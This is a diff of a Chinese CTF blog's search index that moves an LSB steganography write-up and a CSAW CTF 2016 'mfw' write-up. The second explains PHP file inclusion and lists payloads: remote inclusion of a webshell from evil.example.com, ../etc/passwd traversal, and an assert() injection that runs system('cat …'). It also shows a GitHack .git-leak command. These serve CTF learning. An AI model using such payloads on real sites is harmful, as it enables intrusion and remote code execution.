-        <content type="html"><![CDATA[<p>图片隐写题老是一头雾水，借着DD的地铁来学一下吧</p><a id="more"></a><h2 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a>LSB隐写</h2><p>利用图像中的最低有效位进行数据存储。</p><p><img src="https://i.imgur.com/GQM4keP.png" alt="RGB构成"></p><p>一般来说这种隐写都是用BMP图片，不经过压缩，所有的像素都原样存储。png图片有压缩但是却是无损压缩，所以修改的信息也可以正确表达，jpg图片进行压缩之后隐藏的信息可能会被破坏。<br>像素一般由RGB三原色组成，每种颜色占8位，取值为0x00~0xFF,共256种颜色，包含256的3次方种颜色，即16777216种。而人眼大约只能区分1000万种。<br>LSB隐写就是修改RGB颜色分量的最低有效位，每个像素可以携带3比特的信息。</p><p><img src="https://i.imgur.com/jHssNqf.png" alt></p><p>修改绿色的二进制最低位，颜色几乎没有变化，实现信息隐写。</p><p><img src="https://i.imgur.com/ENiocXR.png" alt></p><p><img src="https://i.imgur.com/IHphbX3.png" alt></p><h2 id="来看DD这道题"><a href="#来看DD这道题" class="headerlink" title="来看DD这道题"></a>来看DD这道题</h2><p>给了一张位图，是北京的地铁图。</p><p><img src="https://i.imgur.com/f8eaJYG.png" alt></p><p>尝试LSB，查看低位信息。得到一串密文。</p><p><img src="https://i.imgur.com/04P5AzP.png" alt></p><p>提示是AES，缺少key<br>异或查看图片有两处不同</p><p><img src="https://i.imgur.com/93KEfF7.png" alt></p><p><img src="https://i.imgur.com/NRCfUQe.png" alt></p><p>提示密钥为小写字母，尝试解密就得到了flag.</p>]]></content>
+        <content type="html"><![CDATA[<p>i cant input chinese,so,here is my poor english !</p><a id="more"></a><h1 id="CSAW-CTF-2016-mfw-Writeup"><a href="#CSAW-CTF-2016-mfw-Writeup" class="headerlink" title="CSAW CTF 2016 mfw Writeup"></a>CSAW CTF 2016 mfw Writeup</h1><h2 id="0x01-需要知道的"><a href="#0x01-需要知道的" class="headerlink" title="0x01 需要知道的"></a>0x01 需要知道的</h2><ol><li>本地文件包含</li><li>git源码泄露<h2 id="0x02-本地文件包含"><a href="#0x02-本地文件包含" class="headerlink" title="0x02 本地文件包含"></a>0x02 本地文件包含</h2>来自维基百科的解释：</li></ol><p>In PHP the main cause is due to the use of unvalidated user-input with a filesystem function that includes a file for execution.</p><hr><p>** most notable are the include and require statements.**</p><hr><p>Most of the vulnerabilities can be attributed to novice programmers not being familiar with all of the capabilities of the PHP programming language. The PHP language has a directive which, if enabled,</p><hr><p>** allows filesystem functions to use a URL to retrieve data from remote locations**.[1]</p><hr><p> The directive is allow_url_fopen in PHP versions &lt;= 4.3.4 and allow_url_include since PHP 5.2.0. In PHP 5.x this directive is disabled by default, in prior versions it was enabled by default.[2] To exploit the vulnerability an attacker will alter a variable that is passed to one of these functions to cause it to include malicious code from a remote resource.</p><hr><p>** To mitigate this vulnerability all user input needs to be validated before being used.**</p><p>大体意思就是说使用了 include 和 require 的代码可能会因为代码的质量不好，没有对传入的变量进行检测，导致允许远程主机使用URL里的恶意代码从文件系统里获取到敏感文件信息。</p><p>Example：</p><pre><code>&lt;?php   if ( isset( $_GET[&apos;language&apos;] ) ) {  include( $_GET[&apos;language&apos;] . &apos;.php&apos; );   }?&gt;&lt;form method=&quot;get&quot;&gt;   &lt;select name=&quot;language&quot;&gt;      &lt;option value=&quot;english&quot;&gt;English&lt;/option&gt;      &lt;option value=&quot;french&quot;&gt;French&lt;/option&gt;      ...   &lt;/select&gt;   &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;</code></pre><p>以下是payload:</p><pre><code>/vulnerable.php?language=http://evil.example.com/webshell.txt? - injects a remotely hosted file containing a malicious code (remote file include)/vulnerable.php?language=C:\\ftp\\upload\\exploit - Executes code from an already uploaded file called exploit.php (local file inclusion vulnerability)/vulnerable.php?language=C:\\notes.txt%00 - example using NULL meta character to remove the .php suffix, allowing access to files other than .php. This use of null byte injection was patched in PHP 5.3, and can no longer be used for LFI/RFI attacks.[5]/vulnerable.php?language=../../../../../etc/passwd%00 - allows an attacker to read the contents of the /etc/passwd file on a Unix system through a directory traversal attack.</code></pre><h2 id="0x03-git源码泄露"><a href="#0x03-git源码泄露" class="headerlink" title="0x03 git源码泄露"></a>0x03 git源码泄露</h2><p>使用git在初始化代码库的时候，会在当前目录下产生一个.git的隐藏目录，用来记录代码的变更等。同时使用这个文件可以恢复各个版本的代码，所以如果.git文件可以访问，就可能泄露了源代码。</p><h2 id="0x04-题目"><a href="#0x04-题目" class="headerlink" title="0x04 题目"></a>0x04 题目</h2><p><img src="https://i.imgur.com/1cGM2Pl.png" alt></p><p>查看源码，发现可能的漏洞</p><p><img src="https://i.imgur.com/Qutnt0L.png" alt></p><p>于是我们尝试用文件包含来获取密码信息</p><pre><code>http://111.198.29.45:31930/?page=../../../../../etc/passwd</code></pre><p>发现被过滤了。flag页面可能作为隐藏变量了。</p><p>看到about页面说使用了git</p><p><img src="https://i.imgur.com/qHNE2ot.png" alt></p><p>想到.git源码泄露，访问.git文件，发现可以访问</p><p><img src="https://i.imgur.com/V87suOa.png" alt></p><p>我们使用 工具GitHack将网站源码clone下来。</p><blockquote><p><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p></blockquote><p>GitHack的工作原理是</p><blockquote><p>GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，重建还原工程源代码。<br>渗透测试人员、攻击者，可以进一步审计代码，挖掘：文件上传，SQL注射等web安全漏洞。</p></blockquote><p>使用命令：</p><pre><code>&gt;python2 GitHack.py http://111.198.29.45:31930/.git/</code></pre><p>在flag.php文件中只有：</p><pre><code>&lt;?php// TODO// $FLAG = &apos;&apos;;?&gt;</code></pre><p>没什么帮助，去index.php里查看：</p><pre><code>&lt;?phpif (isset($_GET[&apos;page&apos;])) {$page = $_GET[&apos;page&apos;];} else {    $page = &quot;home&quot;;}$file = &quot;templates/&quot; . $page . &quot;.php&quot;;// I heard &apos;..&apos; is dangerous!assert(&quot;strpos(&apos;$file&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);// TODO: Make this look niceassert(&quot;file_exists(&apos;$file&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;);?&gt;</code></pre><p>这里需要注意的是出现的这几个函数</p><p>strops:<br>返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE.</p><p>assert:*<em>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。<br>*</em></p><p>又看到代码对输入的page变量没有检测，这就是说我们有机会对其改造，使其执行系统命令。<br>下面是大神的payload:</p><pre><code>flag&apos;,&apos;..&apos;)+or+system(&apos;cat+templates/flag.php&apos;);//</code></pre><p>注意到assert语句里的strops是单引号，我们就将其闭合，并执行系统命令获取flag.php文件内容，同时将后面的die语句注释掉。</p><p>大神就是大神！</p>]]></content>
       
       
       <categories>
           
-          <category> ctf </category>
+          <category> WP </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> LSB </tag>
-            
-            <tag> MISC </tag>
-            
-            <tag> 隐写 </tag>
+            <tag> WP </tag>
             
         </tags>
       
@@ -892,6 +913,35 @@
     
     
     <entry>
+      <title>LSB图片隐写</title>
+      <link href="/2018/03/23/LSB%E9%9A%90%E5%86%99/"/>
+      <url>/2018/03/23/LSB%E9%9A%90%E5%86%99/</url>
+      
+        <content type="html"><![CDATA[<p>图片隐写题老是一头雾水，借着DD的地铁来学一下吧</p><a id="more"></a><h2 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a>LSB隐写</h2><p>利用图像中的最低有效位进行数据存储。</p><p><img src="https://i.imgur.com/GQM4keP.png" alt="RGB构成"></p><p>一般来说这种隐写都是用BMP图片，不经过压缩，所有的像素都原样存储。png图片有压缩但是却是无损压缩，所以修改的信息也可以正确表达，jpg图片进行压缩之后隐藏的信息可能会被破坏。<br>像素一般由RGB三原色组成，每种颜色占8位，取值为0x00~0xFF,共256种颜色，包含256的3次方种颜色，即16777216种。而人眼大约只能区分1000万种。<br>LSB隐写就是修改RGB颜色分量的最低有效位，每个像素可以携带3比特的信息。</p><p><img src="https://i.imgur.com/jHssNqf.png" alt></p><p>修改绿色的二进制最低位，颜色几乎没有变化，实现信息隐写。</p><p><img src="https://i.imgur.com/ENiocXR.png" alt></p><p><img src="https://i.imgur.com/IHphbX3.png" alt></p><h2 id="来看DD这道题"><a href="#来看DD这道题" class="headerlink" title="来看DD这道题"></a>来看DD这道题</h2><p>给了一张位图，是北京的地铁图。</p><p><img src="https://i.imgur.com/f8eaJYG.png" alt></p><p>尝试LSB，查看低位信息。得到一串密文。</p><p><img src="https://i.imgur.com/04P5AzP.png" alt></p><p>提示是AES，缺少key<br>异或查看图片有两处不同</p><p><img src="https://i.imgur.com/93KEfF7.png" alt></p><p><img src="https://i.imgur.com/NRCfUQe.png" alt></p><p>提示密钥为小写字母，尝试解密就得到了flag.</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> LSB </tag>
+            
+            <tag> MISC </tag>
+            
+            <tag> 隐写 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>渗透测试-信息收集</title>
       <link href="/2018/03/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
       <url>/2018/03/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
@@ -909,31 +959,6 @@
         <tags>
             
             <tag> 渗透测试 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>CSAW CTF 2016 mfw Writeup</title>
-      <link href="/2018/03/23/CSAW-CTF-2016-mfw-Writeup/"/>
-      <url>/2018/03/23/CSAW-CTF-2016-mfw-Writeup/</url>
-      
-        <content type="html"><![CDATA[<p>i cant input chinese,so,here is my poor english !</p><a id="more"></a><h1 id="CSAW-CTF-2016-mfw-Writeup"><a href="#CSAW-CTF-2016-mfw-Writeup" class="headerlink" title="CSAW CTF 2016 mfw Writeup"></a>CSAW CTF 2016 mfw Writeup</h1><h2 id="0x01-需要知道的"><a href="#0x01-需要知道的" class="headerlink" title="0x01 需要知道的"></a>0x01 需要知道的</h2><ol><li>本地文件包含</li><li>git源码泄露<h2 id="0x02-本地文件包含"><a href="#0x02-本地文件包含" class="headerlink" title="0x02 本地文件包含"></a>0x02 本地文件包含</h2>来自维基百科的解释：</li></ol><p>In PHP the main cause is due to the use of unvalidated user-input with a filesystem function that includes a file for execution.</p><hr><p>** most notable are the include and require statements.**</p><hr><p>Most of the vulnerabilities can be attributed to novice programmers not being familiar with all of the capabilities of the PHP programming language. The PHP language has a directive which, if enabled,</p><hr><p>** allows filesystem functions to use a URL to retrieve data from remote locations**.[1]</p><hr><p> The directive is allow_url_fopen in PHP versions &lt;= 4.3.4 and allow_url_include since PHP 5.2.0. In PHP 5.x this directive is disabled by default, in prior versions it was enabled by default.[2] To exploit the vulnerability an attacker will alter a variable that is passed to one of these functions to cause it to include malicious code from a remote resource.</p><hr><p>** To mitigate this vulnerability all user input needs to be validated before being used.**</p><p>大体意思就是说使用了 include 和 require 的代码可能会因为代码的质量不好，没有对传入的变量进行检测，导致允许远程主机使用URL里的恶意代码从文件系统里获取到敏感文件信息。</p><p>Example：</p><pre><code>&lt;?php   if ( isset( $_GET[&apos;language&apos;] ) ) {  include( $_GET[&apos;language&apos;] . &apos;.php&apos; );   }?&gt;&lt;form method=&quot;get&quot;&gt;   &lt;select name=&quot;language&quot;&gt;      &lt;option value=&quot;english&quot;&gt;English&lt;/option&gt;      &lt;option value=&quot;french&quot;&gt;French&lt;/option&gt;      ...   &lt;/select&gt;   &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;</code></pre><p>以下是payload:</p><pre><code>/vulnerable.php?language=http://evil.example.com/webshell.txt? - injects a remotely hosted file containing a malicious code (remote file include)/vulnerable.php?language=C:\\ftp\\upload\\exploit - Executes code from an already uploaded file called exploit.php (local file inclusion vulnerability)/vulnerable.php?language=C:\\notes.txt%00 - example using NULL meta character to remove the .php suffix, allowing access to files other than .php. This use of null byte injection was patched in PHP 5.3, and can no longer be used for LFI/RFI attacks.[5]/vulnerable.php?language=../../../../../etc/passwd%00 - allows an attacker to read the contents of the /etc/passwd file on a Unix system through a directory traversal attack.</code></pre><h2 id="0x03-git源码泄露"><a href="#0x03-git源码泄露" class="headerlink" title="0x03 git源码泄露"></a>0x03 git源码泄露</h2><p>使用git在初始化代码库的时候，会在当前目录下产生一个.git的隐藏目录，用来记录代码的变更等。同时使用这个文件可以恢复各个版本的代码，所以如果.git文件可以访问，就可能泄露了源代码。</p><h2 id="0x04-题目"><a href="#0x04-题目" class="headerlink" title="0x04 题目"></a>0x04 题目</h2><p><img src="https://i.imgur.com/1cGM2Pl.png" alt></p><p>查看源码，发现可能的漏洞</p><p><img src="https://i.imgur.com/Qutnt0L.png" alt></p><p>于是我们尝试用文件包含来获取密码信息</p><pre><code>http://111.198.29.45:31930/?page=../../../../../etc/passwd</code></pre><p>发现被过滤了。flag页面可能作为隐藏变量了。</p><p>看到about页面说使用了git</p><p><img src="https://i.imgur.com/qHNE2ot.png" alt></p><p>想到.git源码泄露，访问.git文件，发现可以访问</p><p><img src="https://i.imgur.com/V87suOa.png" alt></p><p>我们使用 工具GitHack将网站源码clone下来。</p><blockquote><p><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p></blockquote><p>GitHack的工作原理是</p><blockquote><p>GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，重建还原工程源代码。<br>渗透测试人员、攻击者，可以进一步审计代码，挖掘：文件上传，SQL注射等web安全漏洞。</p></blockquote><p>使用命令：</p><pre><code>&gt;python2 GitHack.py http://111.198.29.45:31930/.git/</code></pre><p>在flag.php文件中只有：</p><pre><code>&lt;?php// TODO// $FLAG = &apos;&apos;;?&gt;</code></pre><p>没什么帮助，去index.php里查看：</p><pre><code>&lt;?phpif (isset($_GET[&apos;page&apos;])) {$page = $_GET[&apos;page&apos;];} else {    $page = &quot;home&quot;;}$file = &quot;templates/&quot; . $page . &quot;.php&quot;;// I heard &apos;..&apos; is dangerous!assert(&quot;strpos(&apos;$file&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);// TODO: Make this look niceassert(&quot;file_exists(&apos;$file&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;);?&gt;</code></pre><p>这里需要注意的是出现的这几个函数</p><p>strops:<br>返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE.</p><p>assert:*<em>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。<br>*</em></p><p>又看到代码对输入的page变量没有检测，这就是说我们有机会对其改造，使其执行系统命令。<br>下面是大神的payload:</p><pre><code>flag&apos;,&apos;..&apos;)+or+system(&apos;cat+templates/flag.php&apos;);//</code></pre><p>注意到assert语句里的strops是单引号，我们就将其闭合，并执行系统命令获取flag.php文件内容，同时将后面的die语句注释掉。</p><p>大神就是大神！</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> WP </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> WP </tag>
             
         </tags>
       
